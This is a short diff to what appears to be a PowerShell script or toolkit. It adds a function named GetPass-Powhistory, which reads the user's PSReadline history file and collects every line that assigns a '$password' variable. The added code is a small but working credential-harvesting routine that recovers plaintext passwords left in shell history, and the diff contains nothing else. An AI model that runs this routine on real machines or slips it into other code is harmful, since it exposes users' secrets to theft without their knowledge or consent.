@@ -915,6 +915,22 @@ function get-MyHelp
     return $helhelp
 }
 
+
+function GetPass-Powhistory
+{
+    $test =  Get-Content (Get-PSReadlineOption).HistorySavePath
+    $res = ''
+    foreach($i in $test)
+    {
+        if ($i -like "*`$password =*")
+        {
+            $res += "$i`n"
+        }
+    }
+    return $res
+}
+
+
 function run-once
 {
     try
